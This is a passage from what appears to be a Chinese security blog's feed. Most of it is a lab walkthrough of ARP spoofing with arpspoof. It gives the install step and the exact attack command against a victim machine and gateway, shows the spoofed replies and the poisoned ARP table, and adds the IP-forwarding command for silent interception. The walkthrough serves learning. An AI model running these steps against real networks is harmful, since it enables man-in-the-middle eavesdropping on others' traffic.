-flushcache</p><p>sudo killall -HUP mDNSResponder</p><p>3、重新检查 resolv.conf 文件，确认已修改为 B 网络环境DNS</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ <span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;nameserver&quot;</span><br>nameserver <span class="hljs-number">223.5</span>.<span class="hljs-number">5.5</span><br></code></pre></td></tr></table></figure><p>4、scutil –dns 查看本机 DNS配置，发现没有生效，还是之前的配置</p><h3 id="尝试解决方案2"><a href="#尝试解决方案2" class="headerlink" title="尝试解决方案2"></a>尝试解决方案2</h3><p>小伙伴提醒，不需要手动配置DNS网关，运营商会默认指定</p><p>1、界面删除DNS</p><p><img src="/image-20241123075929307.png" alt="image-20241123075929307"></p><p>删除233.5.5.5，默认是本地网关</p><p><img src="/image-20241123075954850.png" alt="image-20241123075954850"></p><p>新开终端，重新尝试ping  <a href="http://www.baidu.com,依旧未成功/">www.baidu.com，依旧未成功</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_attack_欺骗</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_attack_%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_attack_%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_arpspoof</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_arpspoof/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_arpspoof/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>kali 默认会存在的 arp 攻击软件</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>apt install dsniff</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="查看版本和帮助"><a href="#查看版本和帮助" class="headerlink" title="查看版本和帮助"></a>查看版本和帮助</h2><p>arpspoof -h</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">└─# arpspoof -h<br>Version: 2.4<br>Usage: arpspoof <span class="hljs-comment">[-i interface]</span> <span class="hljs-comment">[-c own|host|both]</span> <span class="hljs-comment">[-t target]</span> <span class="hljs-comment">[-r]</span> host<br></code></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</p><h3 id="参数解读"><a href="#参数解读" class="headerlink" title="参数解读"></a>参数解读</h3><p>-i interface 指定发送数据报的网卡</p><p>-c own|host|both 指定范围自己|特定主机|两者</p><p>-t target 指定攻击目标，如不指定则为 Lan上的所有主机</p><p>host 要拦截数据报的主机（也就是到那个机器的数据报），常为网关地址</p><p>-r 针对主机和目标主机，捕获双向流量（仅对 -t 生效）</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="攻击机-kali-网卡信息"><a href="#攻击机-kali-网卡信息" class="headerlink" title="攻击机 kali 网卡信息"></a>攻击机 kali 网卡信息</h3><p>ip地址 192.168.3.162</p><p>mac地址 00:0c:29:ac:f2:b5</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root💀kali2021)-[/home/kali]<br>└─<span class="hljs-comment"># ifconfig</span><br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.3.162  netmask 255.255.255.0  broadcast 192.168.3.255<br>        inet6 2408:8207:2517:1041:20c:29ff:feac:f2b5  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;<br>        inet6 2408:8207:2517:1041:4f1:69d3:a0c4:8  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x0&lt;global&gt;<br>        inet6 2408:8207:2517:1041:92f6:6e4b:5410:b43e  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;<br>        inet6 fe80::20c:29ff:feac:f2b5  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;<br>        ether 00:0c:29:ac:f2:b5  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 1396529 </span> bytes<span class="hljs-number"> 1848939788 </span>(1.7 GiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 622124 </span> bytes<span class="hljs-number"> 72476728 </span>(69.1 MiB)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 16 </span> bytes<span class="hljs-number"> 800 </span>(800.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 16 </span> bytes<span class="hljs-number"> 800 </span>(800.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure><h3 id="靶机Windows信息"><a href="#靶机Windows信息" class="headerlink" title="靶机Windows信息"></a>靶机Windows信息</h3><p>ip地址 192.168.3.52</p><p>mac地址 00-0C-29-03-D3-D4</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs less">以太网适配器 Ethernet0:<br><br>连接特定的 DNS 后缀 . . . . . . . :<br>描述. . . . . . . . . . . . . . . : Intel(<span class="hljs-attribute">R) 82574L Gigabit Network Connection</span><br><span class="hljs-attribute">物理地址. . . . . . . . . . . . . </span>: <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-<span class="hljs-number">03</span>-D3-D4<br>DHCP 已启用 . . . . . . . . . . . : 是<br>自动配置已启用. . . . . . . . . . : 是<br>IPv6 地址 . . . . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">d3</span>:<span class="hljs-attribute">a0c4</span>:<span class="hljs-number">9</span>(首选)<br>获得租约的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">13</span>日 <span class="hljs-number">12</span>:<span class="hljs-number">08</span>:<span class="hljs-number">29</span><br>租约过期的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">14</span>日 <span class="hljs-number">11</span>:<span class="hljs-number">29</span>:<span class="hljs-number">36</span><br>IPv6 地址 . . . . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">290</span><span class="hljs-attribute">b</span>:<span class="hljs-number">316</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d19f</span>:<span class="hljs-number">7</span><span class="hljs-built_in">d23</span>(首选)<br>临时 IPv6 地址. . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-attribute">d9d</span>:<span class="hljs-attribute">a397</span>:<span class="hljs-attribute">a3f1</span>:<span class="hljs-built_in">b1e3</span>(首选)<br>临时 IPv6 地址. . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">98</span><span class="hljs-attribute">d8</span>:<span class="hljs-number">6</span><span class="hljs-attribute">db6</span>:<span class="hljs-attribute">f82e</span>:<span class="hljs-number">42</span><span class="hljs-built_in">f4</span>(受到抨击)<br>本地链接 IPv6 地址. . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">290</span><span class="hljs-attribute">b</span>:<span class="hljs-number">316</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d19f</span>:<span class="hljs-number">7</span>d23%<span class="hljs-number">3</span>(首选)<br>IPv4 地址 . . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span>(首选)<br>子网掩码  . . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>获得租约的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">14</span>日 <span class="hljs-number">9</span>:<span class="hljs-number">07</span>:<span class="hljs-number">54</span><br>租约过期的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">21</span>日 <span class="hljs-number">9</span>:<span class="hljs-number">07</span>:<span class="hljs-number">54</span><br>默认网关. . . . . . . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>                                    <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>DHCP 服务器 . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>DHCPv6 IAID . . . . . . . . . . . : <span class="hljs-number">100666409</span><br>DHCPv6 客户端 DUID  . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">2</span>A-<span class="hljs-number">29</span>-ED-<span class="hljs-number">2</span>F-<span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-<span class="hljs-number">03</span>-D3-D4<br>DNS 服务器  . . . . . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>                                    <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>                                    <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>TCPIP 上的 NetBIOS  . . . . . . . : 已启用<br><br><br></code></pre></td></tr></table></figure><h3 id="靶机-ARP-信息"><a href="#靶机-ARP-信息" class="headerlink" title="靶机 ARP 信息"></a>靶机 ARP 信息</h3><p>网关ip地址 192.168.3.1 </p><p>网关mac地址  04-f1-69-d3-a0-c4 </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs subunit">C:\Users\C0isini&gt;arp -a<br><br>接口: 192.168.3.52 --- 0x3<br>  Internet 地址         物理地址              类型<br>  1.1.1.1               01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fc     静态<br>  192.168.3.1           04-f1<span class="hljs-string">-69</span>-d3-a0-c4     动态<br>  192.168.3.66          b0-be<span class="hljs-string">-83</span><span class="hljs-string">-46</span>-e7<span class="hljs-string">-28</span>     动态<br>  192.168.3.116         aa<span class="hljs-string">-26</span><span class="hljs-string">-24</span>-ba<span class="hljs-string">-49</span><span class="hljs-string">-05</span>     动态<br>  192.168.3.144         c4<span class="hljs-string">-07</span><span class="hljs-string">-2</span>f<span class="hljs-string">-25</span><span class="hljs-string">-97</span><span class="hljs-string">-8</span>e     动态<br>  192.168.3.148         be<span class="hljs-string">-13</span><span class="hljs-string">-22</span>-d8-b6<span class="hljs-string">-68</span>     动态<br>  192.168.3.255         ff-ff-ff-ff-ff-ff     静态<br>  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     静态<br>  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     静态<br>  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     静态<br>  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     静态<br>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态<br></code></pre></td></tr></table></figure><h3 id="攻击机上执行攻击命令"><a href="#攻击机上执行攻击命令" class="headerlink" title="攻击机上执行攻击命令"></a>攻击机上执行攻击命令</h3><p>sudo arpspoof -i eth0 -t 192.168.3.52  -r 192.168.3.1</p><p>eth0 攻击机网卡</p><p>192.168.3.52 靶机IP地址</p><p>192.168.3.1 网关地址</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root💀kali2021)-[<span class="hljs-regexp">/home/kali</span>]<br>└─<span class="hljs-comment"># sudo arpspoof -i eth0 -t 192.168.3.52  -r 192.168.3.1</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br></code></pre></td></tr></table></figure><h3 id="查看靶机-ARP-信息"><a href="#查看靶机-ARP-信息" class="headerlink" title="查看靶机 ARP 信息"></a>查看靶机 ARP 信息</h3><p>网关 192.168.3.1 mac地址已由 04-f1-69-d3-a0-c4 修改为攻击机 mac 地址00-0c-29-ac-f2-b5</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit">C:\Users\C0isini&gt;arp -a<br><br>接口: 192.168.3.52 --- 0x3<br>  Internet 地址         物理地址              类型<br>  1.1.1.1               01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fc     静态<br>  192.168.3.1           00<span class="hljs-string">-0</span>c<span class="hljs-string">-29</span>-ac-f2-b5     动态<br>  192.168.3.66          b0-be<span class="hljs-string">-83</span><span class="hljs-string">-46</span>-e7<span class="hljs-string">-28</span>     动态<br>  192.168.3.116         aa<span class="hljs-string">-26</span><span class="hljs-string">-24</span>-ba<span class="hljs-string">-49</span><span class="hljs-string">-05</span>     动态<br>  192.168.3.144         c4<span class="hljs-string">-07</span><span class="hljs-string">-2</span>f<span class="hljs-string">-25</span><span class="hljs-string">-97</span><span class="hljs-string">-8</span>e     动态<br>  192.168.3.148         be<span class="hljs-string">-13</span><span class="hljs-string">-22</span>-d8-b6<span class="hljs-string">-68</span>     动态<br>  192.168.3.162         00<span class="hljs-string">-0</span>c<span class="hljs-string">-29</span>-ac-f2-b5     动态<br>  192.168.3.255         ff-ff-ff-ff-ff-ff     静态<br>  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     静态<br>  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     静态<br>  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     静态<br>  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     静态<br>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态<br></code></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>实现 arp 欺骗，靶机的数据都会传递到攻击机</p><p>现象：</p><p>靶机无法访问网络，攻击机开启端口转发功能后靶机可以正常访问网络</p><p>解决方案：</p><p>开启端口转发命令（默认值为 0 ，也就是不开启端口转发），该端口转发为临时设置，重启会失效，恢复为 0 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1、适用攻击机和靶机在同一网络下</p><p>2、攻击命令需要持续运行，停止运行之后，靶机网关 mac 地址会自动刷新</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_43520214/article/details/123626278">https://blog.csdn.net/weixin_43520214/article/details/123626278</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_driftnet</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_driftnet/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_driftnet/</url>
    
